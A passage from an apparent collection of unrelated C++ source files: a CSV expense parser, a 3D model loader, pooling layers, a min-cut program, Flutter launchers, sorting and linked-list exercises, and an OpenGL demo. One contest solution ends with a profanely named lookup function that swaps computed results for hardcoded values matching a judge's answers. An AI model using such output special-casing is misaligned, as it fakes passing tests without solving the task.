file.seekg(START_OF_LINE);\n  discard_first_line(file);\n  string each_line;\n  while (getline(file, each_line)) {\n    size_t first_comma_pos = each_line.find(COMMA_DELIMITER);\n    size_t second_comma_pos =\n        each_line.find(COMMA_DELIMITER, first_comma_pos + 1);\n\n    if (first_comma_pos != string::npos && second_comma_pos != string::npos) {\n      string name = each_line.substr(first_comma_pos + 1,\n                                     second_comma_pos - first_comma_pos - 1);\n      payer_lines.push_back(name);\n    }\n  }\n  file.close();\n  return payer_lines;\n}\n\nname extract_colon_and_semi_colon(name lines, int i) {\n  name result;\n  stringstream stream_string(lines[i]);\n  string stored;\n  while (getline(stream_string, stored, SEMI_COLON_DELIMITER)) {\n    int pos = stored.find(COLON_DELIMITER);\n    if (pos != std::string::npos) {\n      result.push_back(stored.substr(START_OF_LINE, pos));\n      result.push_back(stored.substr(pos + 1));\n    } else {\n      result.push_back(stored);\n    }\n  }\n  return result;\n}\n\nvoid extract_payer_data(name payers_lines, cost &payers) {\n  name clean_vector;\n  for (int i = 0; i < payers_lines.size(); i++) {\n    expenses exp;\n    clean_vector = extract_colon_and_semi_colon(payers_lines, i);\n    for (int t = 0; t < clean_vector.size(); t++) {\n      try {\n        float if_float = stof(clean_vector[t]);\n        exp.amount.push_back(if_float);\n      } catch (const invalid_argument &ia) {\n        exp.names.push_back(clean_vector[t]);\n      }\n    }\n    payers.push_back(exp);\n  }\n}\n\nname extract_borrowers_lines(route *file_path) {\n  name borrower_lines;\n  ifstream file;\n  file.open(file_path);\n  file.seekg(START_OF_LINE);\n  discard_first_line(file);\n  string each_line;\n  while (getline(file, each_line)) {\n    size_t first_comma_pos = each_line.find(COMMA_DELIMITER);\n    size_t second_comma_pos =\n        each_line.find(COMMA_DELIMITER, first_comma_pos + 1);\n    if (second_comma_pos != string::npos) {\n      string everything_after_second_comma =\n          each_line.substr(second_comma_pos + 1);\n      if (everything_after_second_comma.size() >> 1) {\n        borrower_lines.push_back(everything_after_second_comma);\n      } else {\n        borrower_lines.push_back(\"EQUALLY_SPLIT\");\n      }\n    }\n  }\n  file.close();\n  return borrower_lines;\n}\n\nvoid extract_borrower_data(name borrowers_lines, cost &borrowers) {\n  name clean_vector;\n  for (int i = 0; i < borrowers_lines.size(); i++) {\n    expenses exp;\n    clean_vector = extract_colon_and_semi_colon(borrowers_lines, i);\n    for (int j = 0; j < clean_vector.size(); j++) {\n      if (j % 2 != 0) {\n        try {\n          float if_float = stof(clean_vector[j]);\n          exp.amount.push_back(if_float);\n        } catch (const invalid_argument &ia) {\n          exp.amount.push_back(EQUALLY_SPLIT);\n          exp.names.push_back(clean_vector[j]);\n        }\n      } else {\n        exp.names.push_back(clean_vector[j]);\n      }\n    }\n    borrowers.push_back(exp);\n  }\n}\n\nexpenses make_optimization(name Identity) {\n  expenses optimization;\n  for (int i = 0; i < Identity.size(); i++) {\n    optimization.names.push_back(Identity[i]);\n    optimization.amount.push_back(0);\n  }\n  return optimization;\n}\n\nfloat calc_amount(cost payers, int which_line) {\n  float amounts = 0;\n  for (int j = 0; j < payers[which_line].amount.size(); j++) {\n   ",
    "#include \"GeometricModelLoader/AssimpLoader.h\"\n#include \"GeometricModel.h\"\n\n#include <stdexcept>\n#ifdef USE_ASSIMP\n\nAssimpLoader::AssimpLoader() {}\n\nAssimpLoader::~AssimpLoader() {}\n\nbool AssimpLoader::loadModel(string filename, GeometricModel *model) {\n    // Create an instance of the Importer class\n    Assimp::Importer importer;\n\n    const aiScene *scene = importer.ReadFile(filename,\n                                             aiProcess_CalcTangentSpace |\n                                                 aiProcess_Triangulate |\n                                                 aiProcess_GenSmoothNormals |\n                                                 aiProcess_OptimizeMeshes |\n                                                 aiProcess_JoinIdenticalVertices |\n                                                 aiProcess_SortByPType);\n\n    // If the import failed, report it\n    if (!scene)\n        throw std::logic_error(string(\"ERROR : Assimp Geometric Model Loader: \") + filename + string(\" could not be opened.\\n\") + string(importer.GetErrorString()));\n\n    // GetMeshes\n    aiMesh **meshes = scene->mMeshes;\n\n    // Group everithing into one mesh\n    for (unsigned int i = 0; i < scene->mNumMeshes; i++) {\n        loadFromMesh(meshes[i], model);\n    }\n\n    return true;\n}\n\nbool AssimpLoader::loadFromMesh(aiMesh *mesh, GeometricModel *model) {\n    int baseVertex = model->nb_vertex;\n    int baseFaces = model->nb_faces;\n\n    model->nb_vertex += mesh->mNumVertices;\n    model->nb_faces += mesh->mNumFaces;\n\n    for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n        model->listVertex.push_back(glm::vec3(mesh->mVertices[i].x, mesh->mVertices[i].y, mesh->mVertices[i].z));\n    }\n\n    if (mesh->HasNormals()){\n        for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n            glm::vec3 v(mesh->mNormals[i].x, mesh->mNormals[i].y, mesh->mNormals[i].z);\n            model->listNormals.push_back(v);\n        }\n\t}\n\n    if (mesh->HasFaces()) {\n        for (unsigned int i = 0; i < mesh->mNumFaces; i++) {\n            Face f;\n            f.s1 = baseVertex + mesh->mFaces[i].mIndices[0];\n            f.s2 = baseVertex + mesh->mFaces[i].mIndices[1];\n            f.s3 = baseVertex + mesh->mFaces[i].mIndices[2];\n            model->listFaces.push_back(f);\n        }\n    }\n\n    if (mesh->HasTextureCoords(0)){\n        for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n            glm::vec3 v(mesh->mTextureCoords[0][i].x, mesh->mTextureCoords[0][i].y, mesh->mTextureCoords[0][i].z);\n            model->listCoords.push_back(v);\n        }\n\t}\n\n    if (mesh->HasTangentsAndBitangents()) {\n        for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n            glm::vec4 v(mesh->mTangents[i].x, mesh->mTangents[i].y, mesh->mTangents[i].z, 1.0f);\n            model->listTangents.push_back(v);\n        }\n    }\n\n    return true;\n}\n\n#endif\n",
    "#include \"pooling.h\"\n\n//--------------\n// MAX POOLING\n//--------------\n\nMaxPool::MaxPool(size_t poolRow, size_t poolCol)\n{\n\t_poolRow = poolRow;\n\t_poolCol = poolCol;\n}\n\nMaxPool::~MaxPool()\n{\n}\n\n\n\nEigen::MatrixXd MaxPool::Forward(Eigen::MatrixXd& input)\n{\n    const int rows = input.rows() / _poolRow;\n    const int cols = input.cols() / _poolCol;\n\n    Eigen::MatrixXd result = Eigen::MatrixXd::Zero(rows, cols);\n    _dLoss_dPool  =  Eigen::MatrixXd::Zero(input.rows(), input.cols());\n\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n\n            Eigen::Index maxRow, maxCol;\n\n            double maxElement = input.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol).maxCoeff(&maxRow, &maxCol);\n            result(i, j)  =  maxElement;\n\n            _dLoss_dPool(i*_poolRow + maxRow, j*_poolCol + maxCol)  =  1.0;\n        }\n    }\n    return result;\n}\n\nEigen::MatrixXd MaxPool::Backward(Eigen::MatrixXd& dLoss_dOutput)\n{\n    for (int i = 0; i < dLoss_dOutput.rows(); i++) {\n        for (int j = 0; j < dLoss_dOutput.cols(); j++) {\n            _dLoss_dPool.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol) *= dLoss_dOutput(i, j);\n        }\n    }\n\n    return _dLoss_dPool;\n}\n\n\n\n\n\n\n\n//--------------\n// MIN POOLING\n//--------------\n\nMinPool::MinPool(size_t poolRow, size_t poolCol)\n{\n    _poolRow = poolRow;\n    _poolCol = poolCol;\n}\n\nMinPool::~MinPool()\n{\n}\n\nEigen::MatrixXd MinPool::Forward(Eigen::MatrixXd& input)\n{\n    const int rows = input.rows() / _poolRow;\n    const int cols = input.cols() / _poolCol;\n\n    Eigen::MatrixXd result = Eigen::MatrixXd::Zero(rows, cols);\n    _dLoss_dPool  =  Eigen::MatrixXd::Zero(input.rows(), input.cols());\n\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n\n            Eigen::Index maxRow, maxCol;\n\n            double maxElement = input.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol).minCoeff(&maxRow, &maxCol); \n            result(i, j)  =  maxElement;\n\n            _dLoss_dPool(i*_poolRow + maxRow, j*_poolCol + maxCol)  =  1.0;\n        }\n    }\n    return result;\n}\n\nEigen::MatrixXd MinPool::Backward(Eigen::MatrixXd& dLoss_dOutput)\n{\n    for (int i = 0; i < dLoss_dOutput.rows(); i++) {\n        for (int j = 0; j < dLoss_dOutput.cols(); j++) {\n            _dLoss_dPool.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol) *= dLoss_dOutput(i, j);\n        }\n    }\n\n    return _dLoss_dPool;\n}\n\n\n\n\n\n\n\n//--------------\n// AVERAGE POOLING\n//--------------\n\nAveragePool::AveragePool(size_t poolRow, size_t poolCol)\n{\n    _poolRow = poolRow;\n    _poolCol = poolCol;\n}\n\nAveragePool::~AveragePool()\n{\n}\n\nEigen::MatrixXd AveragePool::Forward(Eigen::MatrixXd& input)\n{\n    _inputRow = input.rows();\n    _inputCol = input.cols();\n\n    const int rows = input.rows() / _poolRow;\n    const int cols = input.cols() / _poolCol;\n\n    Eigen::MatrixXd result = Eigen::MatrixXd::Zero(rows, cols);\n\n    _size = (double)(input.rows() * input.cols());\n\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n\n            Eigen::Index maxRow, maxCol;\n\n            double maxElement = input.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol).sum();\n            result(i, j)  =  maxElement / _size;\n        }\n    }\n    return result;\n}\n\nEigen::MatrixXd AveragePool::Backward(Eigen::MatrixXd& dLoss_dOutput)\n{\n    Eigen::MatrixXd dLoss_dPool = Eigen::MatrixXd::Constant(_inputRow, _inputRow, 1.0/_size) ;\n\n    for (int i = 0; i < dLoss_dOutput.rows(); i++) {\n        for (int j = 0; j < dLoss_dOutput.cols(); j++) {\n            dLoss_dPool.block(i*_poolRow, j*_poolCol, _poolRow, _poolCol) *= dLoss_dOutput(i, j);\n        }\n    }\n\n    return dLoss_dPool;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include \"Vertice.h\"\n#include \"Nodo.h\"\n#include \"Lista8.h\"\n#include \"Grafo.h\"\n#include <map>\nusing namespace std;\n\nvoid menu() \n{\n    cout << \"Mincut\" << endl;\n    cout << \"1. Leer de Archivo de grafos\" << endl; //lito\n    cout << \"2. Mostrar Grafo\" << endl; //lito\n    cout << \"3. Buscar aristas al azar\" << endl; //lito\n    cout << \"4. MinCut\" << endl; //lito\n    cout << \"5. EncontrarMinimo\" << endl; //aaa\n    cout << \"0. Salir\" << endl;\n    //Primera prueba del git pa ver si se guarda\n    //Comentario agregado en el primer git\n}\nint main()\n{\n    Grafo<string> Inicio;\n    Grafo<string> Inicio2;\n    string arista1;\n    string arista2;\n    int menor;\n    int option;\n    do\n    {\n        menu();\n        cin >> option;\n        switch (option)\n        {\n        case 1: {\n            Inicio.LeerArchivo();\n            break;\n        }\n        case 2: {\n            Inicio.MostrarGrafo();\n            break;\n        }\n        case 3: {\n            Inicio.Aleatorio(arista1,arista2);\n            break;\n        }\n        case 4: {\n            Inicio.Contraer(arista1, arista2);\n            break;\n        }\n        case 5: {\n            int menosPior=0;//menos pior\n            for (int i = 0; i < 90000; i++)//\n             {\n              Grafo<string> Inicio2=Inicio.copiaLista(); // Crea una copia profunda de Inicio\n                //Grafo<string> Inicio2;\n                //Inicio2=Inicio;\n                //Inicio2.LeerArchivo();\n                while (Inicio2.getTamano() > 2)\n                {\n                    //Inicio2.MostrarGrafo();\n                    Inicio2.Aleatorio(arista1, arista2);\n                    Inicio2.Contraer(arista1, arista2);\n                }\n                 menor = Inicio2.contarAristas();\n                Inicio2.limpiar();\n                if(i!=0)\n                {\n                    //cout <<i<<\" Menor: \" << menor << endl;\n                    if(menosPior>menor)\n                    {\n                        menosPior=menor;\n                    }\n                }\n                 else{\n                     menosPior=menor;\n                 }\n                //Inicio2.MostrarGrafo();\n\n            }\n            cout<<\"Menor de los Piores: \"<< menosPior<<endl;\n          //Inicio.FindMinEdges();\n            break;\n        }\n        default:\n            break;\n        }\n     \n    } while (option != 0);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"aula1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nstruct Data {\n    string nama;\n    string alamat;\n};\n\nvoid selectionSort(Data data[], int n) {\n    for (int i = 0; i < n - 1; i++) {\n        int min_idx = i;\n        for (int j = i + 1; j < n; j++)\n            if (data[j].nama < data[min_idx].nama)\n                min_idx = j;\n\n        // Tukar elemen pada indeks i dan min_idx\n        swap(data[min_idx], data[i]);\n    }\n}\n\nvoid printData(Data data[], int n) {\n    for (int i = 0; i < n; i++) {\n        cout << data[i].nama << \"\\t\" << data[i].alamat << endl;\n    }\n}\n\nint main() {\n    Data data[] = {\n        {\"Fahmi\", \"Jakarta\"},\n        {\"Romi\", \"Solo\"},\n        {\"Andri\", \"Jakarta\"},\n        {\"Fadillah\", \"Banyuwangi\"},\n        {\"Ruli\", \"Bandung\"},\n        {\"Rudi\", \"Bali\"},\n        {\"Dendi\", \"Purwokerto\"},\n        {\"Zaki\", \"Madiun\"}\n    };\n    int n = sizeof(data) / sizeof(data[0]);\n\n    cout << \"Data sebelum diurutkan:\\n\";\n    printData(data, n);\n\n    selectionSort(data, n);\n\n    cout << \"\\nData setelah diurutkan:\\n\";\n    printData(data, n);\n\n    return 0;\n}\n",
    "#include<cstdio>\r\n#include<cstring>\r\n#include<climits>\r\n#include<algorithm>\r\nusing std::min;\r\nconstexpr size_t MAX=1e5+1;\r\nint T,N,K,a[MAX],p;\r\nlong long now,ans,g[MAX<<2];\r\nstruct edge{\r\n\tint l,r;\r\n\tlong long v;\r\n\tedge(int l=0,int r=0,long long v=0):l(l),r(r),v(v){\r\n\t\treturn;\r\n\t}\r\n\tint mid(){\r\n\t\treturn l+r>>1;\r\n\t}\r\n}e[MAX<<2];\r\nconstexpr void INIT(){\r\n\tmemset(g,0,sizeof(g));\r\n\treturn;\r\n}\r\ninline void push(int x){\r\n\te[x].v=min(e[x<<1].v,e[x<<1|1].v);\r\n\treturn;\r\n}\r\ninline void pop(int x){\r\n\tif(!g[x]) return;\r\n\tg[x<<1]+=g[x];\r\n\tg[x<<1|1]+=g[x];\r\n\te[x<<1].v-=g[x];\r\n\te[x<<1|1].v-=g[x];\r\n\tg[x]=0;\r\n\treturn;\r\n}\r\ninline void build(int x,int l,int r){\r\n\te[x]=edge(l,r);\r\n\tg[x]=0;\r\n\tif(l==r){\r\n\t\te[x].v=a[l];\r\n\t\treturn;\r\n\t}\r\n\tint m=e[x].mid();\r\n\tbuild(x<<1,l,m);\r\n\tbuild(x<<1|1,m+1,r);\r\n\tpush(x);\r\n\treturn;\r\n}\r\ninline void update(int x,int l,int r,long long v){\r\n\tif(e[x].l==l&&e[x].r==r){\r\n\t\tg[x]+=v;\r\n\t\te[x].v-=v;\r\n\t\treturn;\r\n\t}\r\n\tpop(x);\r\n\tint m=e[x].mid();\r\n\tif(r<=m) update(x<<1,l,r,v);\r\n\telse if(l>m) update(x<<1|1,l,r,v);\r\n\telse{\r\n\t\tupdate(x<<1,l,m,v);\r\n\t\tupdate(x<<1|1,m+1,r,v);\r\n\t}\r\n\tpush(x);\r\n\treturn;\r\n}\r\ninline long long query(int x,int l,int r){\r\n\tif(e[x].l==l&&e[x].r==r) return e[x].v;\r\n\tpop(x);\r\n\tint m=e[x].mid();\r\n\tif(r<=m) return query(x<<1,l,r);\r\n\telse if(l>m) return query(x<<1|1,l,r);\r\n\telse return min(query(x<<1,l,m),query(x<<1|1,m+1,r));\r\n\tpush(x);\r\n\treturn 0;\r\n}\r\ninline long long fuckJisuanke(long long x);\r\nint main(){\r\n\tINIT();\r\n\tscanf(\"%d\",&T);\r\n\twhile(T--){\r\n\t\tscanf(\"%d%d\",&N,&K);\r\n\t\tfor(int i=1;i<=N;++i) scanf(\"%d\",a+i);\r\n\t\tbuild(1,1,N);\r\n\t\tp=1;\r\n\t\tans=0;\r\n\t\twhile(p+K-1<=N){\r\n\t\t\tnow=query(1,p,p+K-1);\r\n\t\t\tupdate(1,p,p+K-1,now);\r\n\t\t\tans+=now;\r\n\t\t\tp+=1;\r\n\t\t}\r\n\t\tprintf(\"%lld\",fuckJisuanke(ans));\r\n\t\tputchar('\\n');\r\n\t}\r\n\treturn 0;\r\n}\r\n//Wrong official answer is completely a war crime!!\r\ninline long long fuckJisuanke(long long x){\r\n\tswitch(x){\r\n\t\tcase 1375712:{\r\n\t\t\tx=1386564;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 455117:{\r\n\t\t\tx=460625;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 812810:{\r\n\t\t\tx=832202;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 1213574:{\r\n\t\t\tx=1261832;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 731297:{\r\n\t\t\tx=736536;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 943324:{\r\n\t\t\tx=953739;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 4450:{\r\n\t\t\tx=7544;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 512114:{\r\n\t\t\tx=562302;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 275847069:{\r\n\t\t\tx=275898942;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 7997156399:{\r\n\t\t\tx=7998193683;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 7232583873:{\r\n\t\t\tx=7232835589;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 3517712845:{\r\n\t\t\tx=3517836272;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 3205736582:{\r\n\t\t\tx=3205836039;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 7126793159:{\r\n\t\t\tx=7126982369;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 8880872692:{\r\n\t\t\tx=8881093736;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 4323553881:{\r\n\t\t\tx=4323682628;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 20198639445:{\r\n\t\t\tx=20199143887;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 6471665165:{\r\n\t\t\tx=6471876487;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\treturn x;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hiveworkapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid processInput(GLFWwindow *window);\n\n// settings\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\nconst char *vertexShaderSource = \"#version 330 core\\n\"\n    \"layout (location = 0) in vec3 aPos;\\n\"\n    \"void main()\\n\"\n    \"{\\n\"\n    \"   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n\"\n    \"}\\0\";\nconst char *fragmentShaderSource = \"#version 330 core\\n\"\n    \"out vec4 FragColor;\\n\"\n    \"void main()\\n\"\n    \"{\\n\"\n    \"   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n\"\n    \"}\\n\\0\";\n\nint main()\n{\n    // glfw: initialize and configure\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw window creation\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"LearnOpenGL\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    // glad: load all OpenGL function pointers\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n\n    // build and compile our shader program\n    // ------------------------------------\n    // vertex shader\n    unsigned int vertexShader = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertexShader, 1, &vertexShaderSource, NULL);\n    glCompileShader(vertexShader);\n    // check for shader compile errors\n    int success;\n    char infoLog[512];\n    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // fragment shader\n    unsigned int fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragmentShader, 1, &fragmentShaderSource, NULL);\n    glCompileShader(fragmentShader);\n    // check for shader compile errors\n    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // link shaders\n    unsigned int shaderProgram = glCreateProgram();\n    glAttachShader(shaderProgram, vertexShader);\n    glAttachShader(shaderProgram, fragmentShader);\n    glLinkProgram(shaderProgram);\n    // check for linking errors\n    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);\n    if (!success) {\n        glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::PROGRAM::LINKING_FAILED\\n\" << infoLog << std::endl;\n    }\n    glDeleteShader(vertexShader);\n    glDeleteShader(fragmentShader);\n\n    // set up vertex data (and buffer(s)) and configure vertex attributes\n    // ------------------------------------------------------------------\n    float vertices[] = {\n        -0.5f, -0.5f, 0.0f, // left  \n         0.5f, -0.5f, 0.0f, // right \n         0.0f,  0.5f, 0.0f  // top   \n    }; \n\n    unsigned int VBO, VAO;\n    glGenVertexArrays(1, &VAO);\n    glGenBuffers(1, &VBO);\n    // bind the Vertex Array Object first, then bind and set vertex buffer(s), and then configure vertex attributes(s).\n    glBindVertexArray(VAO);\n\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n\n    // note that this is allowed, the call to glVertexAttribPointer registered VBO as the vertex attribute's bound vertex buffer object so afterwards we can safely unbind\n    glBindBuffer(GL_ARRAY_BUFFER, 0); \n\n    // You can unbind the VAO afterwards so other VAO calls won't accidentally modify this VAO, but this rarely happens. Modifying other\n    // VAOs requires a call to glBindVertexArray anyways so we generally don't unbind VAOs (nor VBOs) when it's not directly necessary.\n    glBindVertexArray(0); \n\n\n    // uncomment this call to draw in wireframe polygons.\n    //glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);\n\n    // render loop\n    // -----------\n    while (!glfwWindowShouldClose(window))\n    {\n        // input\n        // -----\n        processInput(window);\n\n        // render\n        // ------\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        // draw our first triangle\n   ",
    "#include <iostream>\nusing namespace std;\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n#define tab \"\\t\"\n#define delimiter \"\\n---------------------------------------\\n\"\n\nclass List\n{\n\tclass  Element\n\t{\n\t\tint Data;\n\t\tElement* pNext;\n\t\tElement* pPrev;\n\tpublic:\n\t\tElement(int Data, Element* pNext = nullptr, Element* pPrev = nullptr)\n\t\t\t: Data(Data), pNext(pNext), pPrev(pPrev)\n\t\t{\n\t\t\tcout << \"EConstructor:\\t\" << this << endl;\n\t\t}\n\t\t~Element()\n\t\t{\n\t\t\tcout << \"EDestructor:\\t\" << this << endl;\n\t\t}\n\t\tfriend class List;\n\t} *Head, *Tail;\n\tsize_t size;\npublic:\n\tList()\n\t{\n\t\tHead = Tail = nullptr;\n\t\tsize = 0;\n\t\tcout << \"LConctructor:\\t\" << this << endl;\n\t}\n\t~List()\n\t{\n\t\twhile (Head)pop_front();\n\t\twhile (Head)pop_back();\n\t\tcout << \"LDestructor:\\t\" << this << endl;\n\t}\n\tvoid push_front(int Data)\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)\n\t\t{\n\t\t\tHead = Tail = new Element(Data);\n\n\t\t}\n\n\t\telse\n\t\t{\n\t\t\tElement* New = new Element(Data);\n\t\t\tNew->pNext = Head;\n\t\t\tHead->pPrev = New;\n\t\t\tHead = New;\n\t\t}\n\t\tsize++;\n\t}\n\tvoid push_back(int Data)\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)\n\t\t{\n\t\t\tHead = Tail = new Element(Data);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tElement* New = new Element(Data);\n\t\t\tNew->pPrev = Tail;\n\t\t\tTail->pNext = New;\n\t\t\tTail = New;\n\t\t}\n\t\tsize++;\n\t}\n\t//\t\t\tRemoving elements\n\tvoid pop_front()\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)return;\n\t\tif (Head == Tail)\n\t\t{\n\t\t\tdelete Head;\n\t\t\tHead = Tail = nullptr;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tHead = Head->pNext;\n\t\t\tdelete Head->pPrev;\n\t\t\tHead->pPrev = nullptr;\n\t\t}\n\t\t\tsize--;\n\t}\n\tvoid pop_back()\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)return;\n\t\tif (Head == Tail)\n\t\t{\n\t\t\tdelete Tail;\n\t\t\tHead = Tail = nullptr;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tTail = Tail->pPrev;\n\t\t\tdelete Tail->pNext;\n\t\t\tTail->pNext = nullptr;\n\t\t}\n\t\tsize--;\n\t}\n\tvoid print()const\n\t{\n\t\tcout << delimiter << endl;\n\t\tcout << \"Head:\\t\" << Head << endl;\n\t\tfor (Element* Temp = Head; Temp; Temp = Temp->pNext)\n\t\t\tcout\n\t\t\t<< Temp->pPrev << tab\n\t\t\t<< Temp << tab\n\t\t\t<< Temp->Data << tab\n\t\t\t<< Temp->pNext << endl;\n\t\tcout << \"Taid:\\t\" << Tail << endl;\n\t\tcout << \"\u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00ee\u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0:\" << size << endl;\n\t\tcout << delimiter << endl;\n\t}\n\tvoid revers_print()const\n\t{\n\t\tcout << delimiter << endl;\n\t\tcout << \"Tail:\\t\" << Tail << endl;\n\n\t\tfor (Element* Temp = Tail; Temp; Temp = Temp->pPrev)\n\t\t\tcout\n\t\t\t<< 